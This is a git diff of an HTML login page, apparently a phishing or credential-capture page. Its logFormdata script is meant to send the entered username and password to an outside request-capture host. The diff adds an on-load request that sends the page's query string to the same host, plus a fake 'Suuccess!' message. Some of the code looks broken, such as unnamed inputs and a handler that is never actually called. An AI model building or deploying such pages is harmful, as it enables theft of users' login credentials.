@@ -6,15 +6,31 @@
     <title>Login page</title>
 </head>
 <body>
-    <p>Text</p>
-    <form id="loginForm" method="POST" action="/success.html" onsubmit="logFormdata">
-        <input placeholder="username...">
-        <input placeholder="password..." type="password">
-        <br/>
-        <input type = "submit" value="Login">
-    </form>
+    <div id="loginDiv">
+        <p>Text</p>
+        <form id="loginForm" method="POST" action="/?success=success" onsubmit="logFormdata">
+            <input placeholder="username...">
+            <input placeholder="password..." type="password">
+            <br/>
+            <input type = "submit" value="Login">
+        </form>
+    </div>
+    <div id="successDiv" style="display: none;">
+        Suuccess!
+    </div>
 </body>
 <script>
+    function getQueryVariable(variable)
+    {
+       var query = window.location.search.substring(1);
+       var vars = query.split("&");
+       for (var i=0;i<vars.length;i++) {
+               var pair = vars[i].split("=");
+               if(pair[0] == variable){return pair[1];}
+       }
+       return(false);
+    }
+    
     function logFormdata(){
         var form = document.getElementById("loginForm");
         var data = new FormData(form);
@@ -22,8 +38,16 @@
         xhttp.open("POST","https://zyxwv.free.beeceptor.com",true);
         xhttp.send(data);
     }
-    var xhttp = new XMLHttpRequest();
-    xhttp.open("GET","https://zyxwv.free.beeceptor.com/"+location.search,true);
-    xhttp.send();
+
+    document.onload = function(){
+        if(getQueryVariable("success")){
+            document.getElementById("loginDiv").style.display="none";
+            document.getElementById("successDiv").style.display="inline";
+        }else{
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET","https://zyxwv.free.beeceptor.com/"+location.search,true);
+            xhttp.send();
+        }
+    };
 </script>
 </html>
